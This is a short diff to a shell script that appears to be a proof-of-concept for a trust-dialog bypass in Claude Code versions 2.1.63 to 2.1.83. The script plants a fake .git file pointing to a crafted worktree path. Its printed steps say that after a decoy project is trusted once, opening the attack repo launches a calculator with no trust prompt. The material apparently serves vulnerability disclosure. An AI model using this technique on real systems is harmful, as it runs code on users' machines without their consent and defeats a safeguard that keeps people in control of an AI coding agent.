@@ -5,4 +5,9 @@ set -euo pipefail
 cd "$(dirname "$0")"
 printf 'gitdir: .fake/worktrees/x\n' > attack-repo/.git
 echo "[+] Created attack-repo/.git"
-echo "[+] Now open attack-repo with a vulnerable Claude Code (2.1.63 - 2.1.83)."
+echo
+echo "Next steps (vulnerable Claude Code, 2.1.63 - 2.1.83):"
+echo "  1) Trust the decoy project once (accept the trust dialog):"
+echo "         cd trusted-project && claude   # answer 'Yes' to \"Do you trust ...?\", then quit"
+echo "  2) Open the attack repo -> calculator launches with no trust dialog:"
+echo "         cd ../attack-repo && claude"
